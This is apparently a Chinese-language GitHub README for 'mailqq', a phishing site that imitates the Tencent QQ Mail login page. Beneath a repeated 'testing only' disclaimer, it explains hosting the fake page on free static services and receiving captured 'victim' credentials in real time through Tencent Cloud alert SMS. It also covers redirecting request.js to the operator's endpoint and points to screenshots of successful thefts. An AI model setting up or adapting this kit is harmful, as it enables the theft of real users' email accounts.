#### 模拟腾讯QQ邮箱登录界面的钓鱼平台（加强版）

**警告**

![](https://store.heytapimage.com/cdo-portal/feedback/202202/18/d4a816dba4ecdaca33a7cdc61c3f16b6.png)

本项目仅供测试，一切用于违法行为的请自行承担相应责任，与本人无关！！！

本项目仅供测试，一切用于违法行为的请自行承担相应责任，与本人无关！！！

本项目仅供测试，一切用于违法行为的请自行承担相应责任，与本人无关！！！

#### 为啥是加强版本？

此次版本更新为v1.1版本，旧版本请查看 [v1.0](https://github.com/Escher1108/mailqq/tree/v1.0) (该版本后台系统未开源，仅提供一个PHP处理)，此次更新优点如下：

- 剔除了PHP空间依赖。现在可以在任何支持html 的web服务平台跑起来，比如：GitHub pages 、gitee pages 、gitlab pages等。
- 使用“**腾讯云自定义云报警短信（免费短信）**实时接收 受害者 信息 ‘‘。

关于如何使用”**腾讯云自定义云警告短信**“的及搭建请移步：[使用腾讯云自定义告警短信接口搞事情](https://jkgblog.com/1264.html)



#### 如何使用”mailqq“？

修改[requst.js](https://github.com/Escher1108/mailqq/blob/master/js/request.js) 文件中的URL，具体如下：

https://store.heytapimage.com/cdo-portal/feedback/202202/18/ecea7aff1644bc70ca30880144953cb3.png

![](https://store.heytapimage.com/cdo-portal/feedback/202202/18/ecea7aff1644bc70ca30880144953cb3.png)

这里的 请求接口是你自己搭建的腾讯云报警短信接口，本人使用的Node.js，教程中提供的是PHP，二者大佬们自己选择，如果搭建php版本遇到跨域问题，可以尝试我的工具 ”[cors 工具](https://cors.jspproxy.cyou)“

##### 有没有成功案例？答：有，如下图

https://store.heytapimage.com/cdo-portal/feedback/202202/18/1623fdce574f7e13b2115ab66dea7885.png

![](https://store.heytapimage.com/cdo-portal/feedback/202202/18/1623fdce574f7e13b2115ab66dea7885.png)



扩展：QQ邮箱基本版本已经帮你们设置好了，也只需要对接即可。

说明：如果合理利用自定义短信，可以做很多事情！！！
